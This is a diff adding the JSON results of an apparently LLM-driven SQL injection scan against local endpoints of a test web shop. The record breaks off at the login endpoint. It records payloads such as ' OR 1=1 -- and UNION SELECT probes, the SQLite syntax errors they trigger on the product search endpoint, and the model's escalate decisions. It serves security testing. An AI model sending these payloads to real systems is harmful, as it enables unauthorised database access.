@@ -1,0 +1,1048 @@
+{
+  "started_at": "2026-06-25T17:35:46.243407+00:00",
+  "targets_file": "sqli_targets.json",
+  "target_count": 6,
+  "results": [
+    {
+      "method": "GET",
+      "path": "/api/Challenges",
+      "url": "http://127.0.0.1:8080/api/Challenges",
+      "endpoint_context": {
+        "endpoint_type": "list_filter",
+        "resource": "Challenge list",
+        "likely_sql_context": "list_filter",
+        "recommended_attack_style": "filter_boolean_probe",
+        "avoid_payload_styles": [
+          "auth_bypass",
+          "numeric_probe"
+        ],
+        "probe_priority": "high",
+        "confidence": 0.8,
+        "reason": "The endpoint is a GET request with a query parameter 'key', suggesting a filter or search functionality."
+      },
+      "params": [
+        {
+          "name": "key",
+          "in": "query",
+          "endpoint_context": {
+            "endpoint_type": "list_filter",
+            "resource": "Challenge list",
+            "likely_sql_context": "list_filter",
+            "recommended_attack_style": "filter_boolean_probe",
+            "avoid_payload_styles": [
+              "auth_bypass",
+              "numeric_probe"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.8,
+            "reason": "The endpoint is a GET request with a query parameter 'key', suggesting a filter or search functionality."
+          },
+          "suitability": {
+            "probe": true,
+            "confidence": 0.8,
+            "reason": "The endpoint is a GET request with a query parameter 'key', suggesting a filter or search functionality.",
+            "starting_strategy": "filter_boolean_probe"
+          },
+          "payload_count": 2,
+          "attempts": [
+            {
+              "payload_phase": "primary_probe",
+              "payload": "' OR 1=1 --",
+              "payload_rationale": "Boolean probe for filter functionality",
+              "expected_signal": "SQL parser error or unexpected response",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2078,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 200,
+                "elapsed_ms": 2087,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 200,
+                "status_changed": false,
+                "content_type_changed": false,
+                "body_length_delta": 0,
+                "body_changed": false,
+                "elapsed_delta_ms": 9,
+                "sql_error": false,
+                "sql_error_excerpt": "",
+                "dbms_hint": "",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "not_decidable",
+                "confidence": 0.5,
+                "reason": "Baseline and probe are effectively identical and there is no SQL error, auth bypass, timing, content-type, or meaningful body change.",
+                "next_step": "Try another payload or gather more context."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": "' OR '1'='1",
+              "payload_rationale": "Repair the delimiter/parenthesis shape by adding a quote to the boolean probe.",
+              "expected_signal": "SQL parser error with unmatched parentheses or LIKE-wrapped search text.",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2097,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 200,
+                "elapsed_ms": 2067,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 200,
+                "status_changed": false,
+                "content_type_changed": false,
+                "body_length_delta": 0,
+                "body_changed": false,
+                "elapsed_delta_ms": -30,
+                "sql_error": false,
+                "sql_error_excerpt": "",
+                "dbms_hint": "",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "not_decidable",
+                "confidence": 0.5,
+                "reason": "Baseline and probe are effectively identical and there is no SQL error, auth bypass, timing, content-type, or meaningful body change.",
+                "next_step": "Try another payload or gather more context."
+              }
+            }
+          ],
+          "final_decision": "not_decidable",
+          "strongest_decision": "not_decidable",
+          "stop_reason": "Stopped because the response matched baseline closely; there was no useful error or behavior signal to adapt from."
+        }
+      ]
+    },
+    {
+      "method": "GET",
+      "path": "/rest/products/search",
+      "url": "http://127.0.0.1:8080/rest/products/search",
+      "endpoint_context": {
+        "endpoint_type": "search",
+        "resource": "product search results",
+        "likely_sql_context": "string_search",
+        "recommended_attack_style": "string_search_error_probe",
+        "avoid_payload_styles": [
+          "auth_bypass",
+          "numeric_probe"
+        ],
+        "probe_priority": "high",
+        "confidence": 0.8,
+        "reason": "search endpoint with query parameter"
+      },
+      "params": [
+        {
+          "name": "q",
+          "in": "query",
+          "endpoint_context": {
+            "endpoint_type": "search",
+            "resource": "product search results",
+            "likely_sql_context": "string_search",
+            "recommended_attack_style": "string_search_error_probe",
+            "avoid_payload_styles": [
+              "auth_bypass",
+              "numeric_probe"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.8,
+            "reason": "search endpoint with query parameter"
+          },
+          "suitability": {
+            "probe": true,
+            "confidence": 0.8,
+            "reason": "search endpoint with query parameter",
+            "starting_strategy": "string_search_error_probe"
+          },
+          "payload_count": 7,
+          "attempts": [
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='a",
+              "payload_rationale": "string_search_error_probe",
+              "expected_signal": "SQL parser error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2086,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2101,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 15,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "read_confirmation",
+              "payload": "UNION SELECT NULL, 'marker'",
+              "payload_rationale": "The payload string must come from your reasoning, not from code constants. Using UNION SELECT with a harmless marker string.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "marker",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2098,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2088,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 984,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 954,
+                "body_changed": true,
+                "elapsed_delta_ms": -10,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false,
+                "read_marker": "marker",
+                "read_marker_reflected": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='b",
+              "payload_rationale": "Repair the delimiter/parenthesis/comment shape by changing the boolean condition.",
+              "expected_signal": "SQL parser error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2091,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2085,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": -6,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='c",
+              "payload_rationale": "Add a single quote to the payload to fix the missing delimiter issue.",
+              "expected_signal": "SQL parser error with a syntax error message",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2064,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2103,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 39,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='d",
+              "payload_rationale": "Add a different character to the payload to avoid repeating the exact shape of the previous payload.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2066,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2071,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 5,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='e",
+              "payload_rationale": "Repair the delimiter/parenthesis/comment shape by adding a closing quote to the previous payload.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2056,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2083,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 27,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='g",
+              "payload_rationale": "The previous payload was rejected for repeating an already attempted payload. The next payload should contain a different value.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2087,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2087,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 0,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            }
+          ],
+          "final_decision": "escalate",
+          "strongest_decision": "escalate",
+          "stop_reason": "Max attempts reached.",
+          "confirmation_rejections": [
+            {
+              "payload": "UNION SELECT NULL, NULL",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: String/search probe rejected because it lacks a string delimiter."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "String/search probe rejected because it lacks a string delimiter.",
+                "next_step": "Return only a parameter value that includes a quote or double-quote delimiter and a harmless boolean comparison."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 954,
+                "body_changed": true,
+                "elapsed_delta_ms": -10,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false,
+                "read_marker": "marker",
+                "read_marker_reflected": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "method": "GET",
+      "path": "/rest/user/change-password",
+      "url": "http://127.0.0.1:8080/rest/user/change-password",
+      "endpoint_context": {
+        "endpoint_type": "sensitive_write",
+        "resource": "User password change",
+        "likely_sql_context": "write_operation",
+        "recommended_attack_style": "skip_low_value",
+        "avoid_payload_styles": [
+          "union_enum"
+        ],
+        "probe_priority": "skip",
+        "confidence": 0.8,
+        "reason": "Endpoint path and parameter names suggest a sensitive write operation."
+      },
+      "params": [
+        {
+          "name": "current",
+          "in": "query",
+          "endpoint_context": {
+            "endpoint_type": "sensitive_write",
+            "resource": "User password change",
+            "likely_sql_context": "write_operation",
+            "recommended_attack_style": "skip_low_value",
+            "avoid_payload_styles": [
+              "union_enum"
+            ],
+            "probe_priority": "skip",
+            "confidence": 0.8,
+            "reason": "Endpoint path and parameter names suggest a sensitive write operation."
+          },
+          "suitability": {
+            "probe": false,
+            "confidence": 1,
+            "reason": "Endpoint is a sensitive write operation and recommends skipping low-value probes.",
+            "starting_strategy": "skip"
+          },
+          "payload_count": 0,
+          "attempts": [],
+          "final_decision": "stop",
+          "strongest_decision": "stop",
+          "stop_reason": "Skipped by suitability gate: Endpoint is a sensitive write operation and recommends skipping low-value probes."
+        }
+      ]
+    },
+    {
+      "method": "POST",
+      "path": "/rest/user/login",
+      "url": "http://127.0.0.1:8080/rest/user/login",
+      "endpoint_context": {
+        "endpoint_type": "auth_login",
+        "resource": "User Login",
+        "likely_sql_context": "auth_lookup",
+        "recommended_attack_style": "auth_boolean_bypass",
+        "avoid_payload_styles": [
+          "union_enum",
+          "auth_bypass",
+          "numeric_probe"
+        ],
+        "probe_priority": "high",
+        "confidence": 0.9,
+        "reason": "Endpoint is a login form with email and password fields, suggesting an authentication lookup"
+      },
+      "params": [
+        {
+          "name": "email",
+          "in": "json",
+          "endpoint_context": {
+            "endpoint_type": "auth_login",
+            "resource": "User Login",
+            "likely_sql_context": "auth_lookup",
+            "recommended_attack_style": "auth_boolean_bypass",
+            "avoid_payload_styles": [
+              "union_enum",
+              "auth_bypass",
+              "numeric_probe"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.9,
+            "reason": "Endpoint is a login form with email and password fields, suggesting an authentication lookup"
+          },
+          "suitability": {
+            "probe": true,
+            "confidence": 0.9,
